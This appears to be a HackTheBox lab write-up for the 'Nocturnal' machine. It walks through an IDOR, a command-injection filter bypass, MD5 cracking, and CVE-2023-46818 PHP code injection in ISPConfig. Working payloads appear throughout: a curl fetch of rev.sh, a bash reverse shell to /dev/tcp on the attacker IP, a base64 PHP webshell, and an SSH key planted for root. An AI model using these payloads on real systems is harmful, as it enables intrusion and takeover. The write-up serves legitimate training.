---
maquina: "Nocturnal"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "12 Apr 2025"
retire: "16 Aug 2025"
creadores: "FisMatHack"
htb_url: "https://hackthebox.com/machines/nocturnal"
app_url: "https://app.hackthebox.com/machines/656"
url: "https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Nocturnal presents a website with an IDOR vulnerability that allows me to read other user’s files, and leak the admin password. Inside the admin panel, I’ll find a command injection vulnerability in the admin backup utility and exploit it to get a foothold. I’ll crack a hash to get the next user’s password. For root, there’s an instance of ISPConfig. I’ll exploit a PHP code injection vulnerability to get execution and a shell as root. In Beyond Root, I’ll look at the website file download feature before HTB patched it one week after Nocturnal’s release.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.64
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 20:44 UTC
Nmap scan report for 10.10.11.64
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.64
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 20:45 UTC
Nmap scan report for 10.10.11.64
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

Based on the [OpenSSH and nginx versions](https://0xdf.gitlab.io/cheatsheets/os#), the host is likely running Ubuntu 20.04 focal (though it could be 20.10 groovy as well).

The webserver is sending a redirect to `nocturnal.htb`. Given the use of virtual host routing, I’ll use `ffuf` to look for any subdomains of `nocturnal.htb` that respond differently. On finding none, I’ll add it to my `/etc/hosts` file:

```plaintext
10.10.11.64 nocturnal.htb
```

I’ll re-scan port 80 with `nmap` using the domain name:

```console
oxdf@hacky$ nmap -p 80 -sCV nocturnal.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 20:57 UTC
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

I’ll note the `PHPSESSID` cookie, which suggests a PHP website.

### Website - TCP 80

#### Site

The site is a cloud storage / file sharing site:

![image-20250413122731340](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413122731340.png)

The login page at `/login.php` has a login form asking for username and password:

![image-20250413122915929](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413122915929.png)

Guessing at some basic username / password combos only ever returns:

![image-20250413122956470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413122956470.png)

I am able to enumerate users through the registration link at `/register.php`. If I try to register the username admin it returns an error:

![image-20250413123036649](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413123036649.png)

That suggests that this username is already registered.

Giving it the username 0xdf with the same password redirects back to the login page, where I can login. Logging in returns a dashboard where I can upload files and see my files:

![image-20250413123229299](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413123229299.png)

If I try to upload an image file, it shows an error at the top right:

![image-20250413123414043](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413123414043.png)

I’ll find a sample `.doc` file and upload it, and it shows up in “Your Files”:

![image-20250413124534420](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413124534420.png)

The link is `/view.php?username=0xdf&file=file-sample_100kB.doc`. Clicking it does return the file.

#### Tech Stack

The HTTP response headers show an nginx server with a PHP session cookie:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 13 Apr 2025 16:28:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=ehi1elepd462f2jei3fbajt9tm; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1524
```

The main page loads as `index.php`, and the other pages are all `.php` as well. This is clearly a PHP site.

The 404 page is the [default nginx 404](https://0xdf.gitlab.io/cheatsheets/404#nginx) showing the OS is Ubuntu:

![image-20250413124751089](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250413124751089.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```console
oxdf@hacky$ feroxbuster -u http://nocturnal.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nocturnal.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://nocturnal.htb/admin.php => login.php
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       29l      145w     1524c http://nocturnal.htb/
302      GET        0l        0w        0c http://nocturnal.htb/logout.php => login.php
403      GET        7l       10w      162c http://nocturnal.htb/uploads
200      GET       29l      145w     1524c http://nocturnal.htb/index.php
302      GET      123l      236w     2919c http://nocturnal.htb/view.php => login.php
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
302      GET        0l        0w        0c http://nocturnal.htb/dashboard.php => login.php
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET        7l       10w      162c http://nocturnal.htb/uploads_user
403      GET        7l       10w      162c http://nocturnal.htb/uploads_group
403      GET        7l       10w      162c http://nocturnal.htb/uploads2
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET        7l       10w      162c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads3
[####################] - 2m     60003/60003   0s      found:19      errors:2
[####################] - 2m     30000/30000   271/s   http://nocturnal.htb/
[####################] - 2m     30000/30000   272/s   http://nocturnal.htb/backups/
```

It looks like there’s a rule of some kind blocking anything starting with “uploads”. I’ll do some manual testing. `/upload` returns 404, but `/uploads` returns 403, as does `/uploads0xdf`, but not `/0xdfuploads`. It seems the rule is blocking any path that starts with `/uploads`.

There is an `admin.php`, but it redirects to `/login.php`. There’s also a `/backups/` that returns 403.

## Shell as www-data

### Access Admin Panel

#### Identify User Oracle / IDOR

The most interesting request made in playing with the site was to download a file. The URL is `/view.php?username=0xdf&file=file-sample_100kB.doc`. I’ll send that request to Burp Repeater and play with it a bit. If I change the filename to a different extension, it’s still checking that against either a block list or an allow list:

![image-20250414142857593](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414142857593.png)

If I instead change the name leaving the extension as `.doc`, it sends a different error (and shows the available files):

![image-20250414142939085](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414142939085.png)

If I set back the filename to what I uploaded and change the user, there’s another error:

![image-20250414143028349](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414143028349.png)

If I register another account, another0xdf, and then try that name in this request with the file uploaded by 0xdf, it returns to the same error as having a bad file:

![image-20250414143206711](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414143206711.png)

It shows no files for download, but I haven’t uploaded any for this user. I’ll upload `test.doc` as another0xdf, and then resend that request:

![image-20250414143335075](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414143335075.png)

I’m requesting `file-sample_100kb.doc`, which is not found, but it is showing me a list of files from the another0xdf user. Through this end point not only can I validate that another0xdf is a user, but there’s an insecure direct object reference (IDOR) vulnerability that allows me to see and access that user’s files. I’ll change the filename to `test.doc`, and response includes that file.

A quick check for the admin user shows that they do exist, but have no files.

#### Brute Force Users

I’ll use `ffuf` to try a long list of names and see if any exist with the following options:

- `-u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc'` - The URL to test, with `FUZZ` where the username will insert from the wordlist. The `view.php` endpoint is much better than the registration endpoint for this, as the registration endpoint would create accounts when the user isn’t found.
- `-b 'PHPSESSID=lvn0jnogg9u3ntc0f6e6jcjbpg'` - Session cookie from my current session.
- `-w /opt/SecLists/Usernames/Names/names.txt` - [SecLists](https://github.com/danielmiessler/SecLists) is always my go-to for wordlists. `names.txt` is not too big, but has a bunch of names. I could try some others as well.
- `-fr 'User not found'` - Filter responses that have “User not found” in the response body. I could just as easily do `-mr 'File does not exist'`, as that implies that the user does (and assumes they don’t have a `test.doc`).

```console
oxdf@hacky$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc' -b 'PHPSESSID=lvn0jnogg9u3ntc0f6e6jcjbpg' -w /opt/SecLists/Usernames/Names/names.txt -fr 'User not found'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.doc
 :: Wordlist         : FUZZ: /opt/SecLists/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=lvn0jnogg9u3ntc0f6e6jcjbpg
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: User not found
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 92ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 91ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 95ms]
```

It finds two more users as well as the admin user I had guessed already. The tobias user doesn’t have any files.

#### Amanda’s Password

The amanda user does have a file, `privacy.odt`:

![image-20250414152430863](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414152430863.png)

I’ll visit `/view.php?username=amanda&file=privacy.odt` in the browser and it downloads the file. When the box first released, the file download was broken. I’ll cover that in Beyond Root.

The file is a welcome letter with a password:

![image-20250414160954353](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414160954353.png)

That password works for amanda to log into the website:

![image-20250414161211828](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414161211828.png)

In addition to `privacy.odt`, there’s also a link to `/admin.php`

### RCE

#### Admin Panel Enumeration

The admin panel has a page showing the website and offering backups:

![image-20250414161323623](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414161323623.png)

If I enter a password and click “Create Backup”, it shows the results in the panel below the button:

![image-20250414161740559](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414161740559.png)

Right away I spot that this looks like the output of the `zip` command (and am immediately thinking command injection). Clicking “Download Backup” saves a file named `backup_2024-04-14.zip` to my system.

I’m able to unzip it using the password I gave:

```console
oxdf@hacky$ unzip backup_2025-04-14.zip
Archive:  backup_2025-04-14.zip
[backup_2025-04-14.zip] admin.php password:
  inflating: admin.php
   creating: uploads/
  inflating: uploads/privacy.odt
  inflating: uploads/file-sample_100kB.doc
  inflating: register.php
  inflating: login.php
  inflating: dashboard.php
  inflating: index.php
  inflating: view.php
  inflating: logout.php
  inflating: style.css
```

#### Site Source

Towards the top of each file that uses the database is a database connection that looks like:

```php
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

The most interesting file is `admin.php`, where the `zip` command is being run. Towards the bottom of the file I’ll find:

```php
...[snip]...
<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';

        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }
...[snip]...
```

It’s building a string from the POST request into the string and running it with `proc_open`. The user-submitted data does pass through the `cleanEntry` function first. This function is removing most of the special characters that would be used in command injection:

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

#### Command Injection POC

One thing missed in the `cleanEntry` function is the `\n` character. A newline will make a new command in `proc_open`, as shown by this comment on the [php docs page](https://www.php.net/manual/en/function.proc-open.php):

![image-20250414162619438](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414162619438.png)

I’ll submit for backup with the password “0xdf%0aid#”, which will make the command that creates the zip be:

```bash
zip -x './backups/*' -r -P 0xdf
id# backup_YYYY-MM-DD .  > /tmp/backup_UUID.log 2>&1 &
```

This fails:

![image-20250414164050222](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414164050222.png)

It’s trying to run the command `id#`. Some playing around and I wasn’t able to get spacing right to make that work, but it occurs to me that this is not typical `bash` behavior. I’ll try running `bash -c` with a command, but space is also blocked. Tab (`%09`) is not though, so my password becomes `0xdf%0abash%09-c%09"id"#`, which makes the command:

```bash
zip -x './backups/*' -r -P 0xdf
bash	-c	"id"# backup_YYYY-MM-DD .  > /tmp/backup_UUID.log 2>&1 &
```

It works:

![image-20250414164433069](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414164433069.png)

Ippsec later pointed out to me that just using another `%0a` at the end instead of a `#` would work as well.

#### Shell

I can’t use a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) directly because `&` is blocked. I’ll try `curl` with `0xdf%0abash%09-c%09"curl%09http://10.10.14.6/rev.sh"`. I’ll start a Python webserver (`python -m http.server 80`) and on sending that, I get a request at the server:

```console
10.10.11.64 - - [14/Apr/2025 20:28:47] code 404, message File not found
10.10.11.64 - - [14/Apr/2025 20:28:47] "GET /rev.sh HTTP/1.1" 404 -
```

And the results show it failed to find `rev.sh`:

![image-20250414165913837](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414165913837.png)

I’ll create a `rev.sh` with a rev shell in it:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

Now I’ll update my command to get this script and run it:

![image-20250414170241392](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414170241392.png)

I’ve got two newlines, so it runs the `curl` call to get the file and then `bash rev.sh`. On sending, there’s a hit on the webserver that returns the file:

```console
10.10.11.64 - - [14/Apr/2025 20:34:07] "GET /rev.sh HTTP/1.1" 200 -
```

And then a shell at my waiting `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.64 57644
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$
```

I’ll do the standard [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@nocturnal:~/nocturnal.htb$ script /dev/null -c bash
Script started, file is /dev/null
www-data@nocturnal:~/nocturnal.htb$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@nocturnal:~/nocturnal.htb$
```

## Shell as tobias

### Enumeration

#### Users

There’s one user with a home directory in `/home`:

```console
www-data@nocturnal:/home$ ls
tobias
```

tobias, root, and two other users have shells configured in `/etc/passwd`:

```console
www-data@nocturnal:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
```

www-data cannot read files in `/home/tobias`. There is no `/var/www/apps` directory (maybe left over from a no longer existing site). I’ll come back to ispconfig later.

#### Web Directories

In `/var/www/` there are multiple directories:

```console
www-data@nocturnal:~$ ls
html  ispconfig  nocturnal.htb  nocturnal_database  php-fcgi-scripts
```

- `html` has the default nginx page.
- `nocturnal.htb` has the website I’ve already interacted with.
- `nocturnal_database` contains a single file, `nocturnal_database.db`
- `php-fcgi-scripts` contains two directories, both of which contain a single `.php-fcgi-starter` file.
- `ispconfig` has another web application. I’ll come back to this for root.

#### nocturnal_database.db

The database has two tables:

```console
www-data@nocturnal:~$ sqlite3 nocturnal_database/nocturnal_database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
uploads  users
```

`uploads` isn’t too interesting. `users` has password hashes for the users on the site:

```console
sqlite> .headers on
sqlite> select * from users;
id|username|password
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|0xdf|465e929fc1e0853025faad58fc8cb47d
7|another0xdf|465e929fc1e0853025faad58fc8cb47d
```

These hashes look like MD5s given their 32 hex characters. The source code from `login.php` confirms:

```php
    if ($result && md5($password) === $result['password']) {
        $_SESSION['user_id'] = $result['id'];
        $_SESSION['username'] = $username;
        header('Location: dashboard.php');
        exit();
    } else {
        $error = 'Invalid username or password.';
    }
```

### su / SSH

I’ll try the hashes for admin and tobias in [CrackStation](https://crackstation.net/):

![image-20250414172223946](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414172223946.png)

tobias’ password works with `su` for the system password:

```console
www-data@nocturnal:~$ su - tobias
Password:
tobias@nocturnal:~$
```

It also works over SSH from my host:

```console
oxdf@hacky$ sshpass -p 'slowmotionapocalypse' ssh tobias@nocturnal.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
...[snip]...
tobias@nocturnal:~$
```

The user flag is in tobias’ home directory:

```console
tobias@nocturnal:~$ cat user.txt
8c2ce65e************************
```

## Shell as root

### Enumeration

#### Users

There’s nothing interesting in tobias’ home directory other than `user.txt`:

```console
tobias@nocturnal:~$ ls -la
total 36
drwxr-x--x 5 tobias tobias 4096 Oct 19 03:23 .
drwxr-xr-x 3 root   root   4096 Oct 17 22:19 ..
lrwxrwxrwx 1 root   root      9 Oct 18 00:20 .bash_history -> /dev/null
-rw-r--r-- 1 tobias tobias  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tobias tobias 3771 Feb 25  2020 .bashrc
drwx------ 2 tobias tobias 4096 Oct 18 01:35 .cache
drwxrwxr-x 3 tobias tobias 4096 Oct 18 01:53 .local
-rw-r--r-- 1 tobias tobias  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Oct 18 00:21 .sqlite_history -> /dev/null
drwx------ 2 tobias tobias 4096 Oct  4  2024 .ssh
-rw-r----- 1 root   tobias   33 Oct 18 00:16 user.txt
```

tobias cannot run `sudo`:

```console
tobias@nocturnal:~$ sudo -l
[sudo] password for tobias:
Sorry, user tobias may not run sudo on nocturnal.
```

#### ISP

Looking at the listening ports, there’s something listening on port 8080 that I couldn’t reach before:

```console
tobias@nocturnal:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```

There’s a `php` process running as root listening on port 8080:

```console
tobias@nocturnal:~$ ps auxww | grep 8080
root         814  0.0  0.6 211568 27012 ?        Ss   20:17   0:00 /usr/bin/php -S 127.0.0.1:8080
tobias      2288  0.0  0.0   6432   720 pts/2    S+   21:32   0:00 grep --color=auto 8080
```

I don’t know for sure what directory this is running out of, but I can guess that this matches up with the `ispconfig` directory from `/var/www`. Interestingly, tobias can’t enter that directory:

```console
tobias@nocturnal:/var/www$ cd ispconfig
-bash: cd: ispconfig: Permission denied
```

But www-data can:

```console
www-data@nocturnal:~$ cd /var/www/ispconfig
www-data@nocturnal:~/ispconfig$ ls
admin        dashboard          index.php      mailuser    sites          vm
capp.php     datalogstatus.php  js             monitor     strengthmeter
client       dns                keepalive.php  nav.php     temp
common.php   dummy_login.html   login          remote      themes
content.php  help               mail           robots.txt  tools
```

#### Site

I’ll reconnect over SSH with `-L 9001:localhost:8080` to tunnel my local port 9001 to port 8080 on Nocturnal (I could pick any port to listen on locally - 8080 is already in use, so I’ll go with 9001). Now on visiting `http://127.0.0.1:9001` in my browser, the [IPSConfig](https://www.ispconfig.org/) login page loads:

![image-20250414173143332](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173143332.png)

Looking at the page source there’s a hint that this might be version 3.2:

![image-20250414173259769](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173259769.png)

tobias’ password doesn’t work for a tobias user, but it does work for admin:

![image-20250414173513864](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173513864.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The “Help” page confirms the version:

![image-20250414173553674](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414173553674.png)

### Identify CVE-2023-46818

Searching for “ispconfig cve” returns a couple interesting CVEs:

![image-20250414174733421](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250414174733421.png)

CVE-2024-53720 as an SSRF could be interesting, but I’ll start with CVE-2023-46818 as it mentions “PHP code injection” which can be execution.

The description on the [NIST page](https://nvd.nist.gov/vuln/detail/CVE-2024-53720) says:

> An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.

The version on Nocturnal should be vulnerable.

### CVE-2023-46818 [Manual]

#### Code Injection POC

Well before Nocturnal’s release, there is a POC exploit Python script on GitHub, and that’s the intended way to solve the box. I’ll still take a section to show how the vulnerability works manually.

The issue is in the `/admin/language_edit.php` function. I’ll send an authenticated request over to Burp Repeater (check out my [FoxyProxy/Burp setup](https://www.youtube.com/watch?v=iTm33Miymdg) and make sure `network.proxy.allow_hijacking_localhost` is true in Firefox’s about:config) and make it a post, get rid of unnecessary headers, and add the post body to creat a language file:

![image-20250813104118396](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104118396.png)

In this response, I need the CSRF id and key at the very bottom:

![image-20250813104144096](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104144096.png)

I’ll add those two values along with a command injection payload in the `records[\]` parameter :

![image-20250813104259651](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104259651.png)

I’m having it `ping` my host one time. It shows the results in the response, and I can see it at `tcpdump` on my host:

```console
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:42:21.141465 IP 10.10.11.64 > 10.10.14.6: ICMP echo request, id 4, seq 1, length 64
14:42:21.141492 IP 10.10.14.6 > 10.10.11.64: ICMP echo reply, id 4, seq 1, length 64
```

If I want to change the command, I have to create a new lang file and get new CSRF data, or it returns “CSRF attempt blocked”:

![image-20250813104439640](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813104439640.png)

#### File Write

In the POC, it writes a webshell using `file_put_contents`, like this (with a fresh `lang_file` and CSRF):

![image-20250813103715037](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813103715037.png)

That file is not only there, but accessible without auth:

```console
oxdf@hacky$ curl localhost:9001/admin/0xdf.txt
owned_by_0xdf
```

I’ll create a new `.lng` file, get the CSRF data, and then write a shell. Writing special characters is hard, so I’ll base64-encode and decode:

```console
oxdf@hacky$ echo '<?php system($_REQUEST["cmd"]) ; ?>' | base64
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K
```

Now I’ll write a webshell:

![image-20250813110133437](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250813110133437.png)

And it works:

```console
oxdf@hacky$ curl localhost:9001/admin/0xdf.php?cmd=id
uid=0(root) gid=0(root) groups=0(root)
```

### CVE-2023-46818 [Exploit Script]

There’s a [Python POC](https://github.com/bipbopbup/CVE-2023-46818-python-exploit) from bipbopbup on GitHub that released 6 months before Nocturnal. I’ll save a copy on my host. It imports the `requests` library, so I’ll use the preferred `uv` [workflow](https://0xdf.gitlab.io/cheatsheets/uv#) to add that to the script and run it in a unique virtual environment.

First I add it:

```console
oxdf@hacky$ uv add --script cve-2023-46818.py requests
Updated `cve-2023-46818.py`
```

This adds this comment to the top of the script:

```python
# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests",
# ]
# ///
```

Now I’ll run it with `uv`:

```console
oxdf@hacky$ uv run cve-2023-46818.py
Installed 5 packages in 7ms

Usage: python cve-2023-46818.py <URL> <Username> <Password>
```

It installs the packages (`requests`) needed for the script into a virtual environment (which takes 7ms), and then runs showing the help.

I’ll run with those arguments:

```console
oxdf@hacky$ uv run cve-2023-46818.py http://localhost:9001 admin slowmotionapocalypse
[+] Target URL: http://localhost:9001/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell#
```

This exploit writes a webshell to the target and then enters a `while True` loop reading a command and sending it to the webshell. It’s running as root:

```console
ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```

### SSH

The public POC provides an annoying shell because it doesn’t keep any kind of state. Even with my own webshell or a reverse shell, it can be far more stable to upgrade using SSH. I’ll write my SSH public key into `authorized_keys` for root:

```console
ispconfig-shell# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
" > /root/.ssh/authorized_keys
```

Now I can connect over SSH using that key:

```console
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@nocturnal.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
...[snip]...
root@nocturnal:~#
```

And grab `root.txt`:

```console
root@nocturnal:~# cat root.txt
0a081553************************
```

## Beyond Root - Patched Website

### Background

When Nocturnal first released, the downloaded file feature in the website was a bit broken. This was fixed to return the file in the patch on 17 April 2025:

![image-20250418140100858](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250418140100858.png)

### Header Issue

For the original release, it has to do with how the file came back HTML-wrapped. When there’s a failure, the response headers send a `Content-Type` of `text.html`:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Apr 2025 20:39:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 3113

...[snip]...
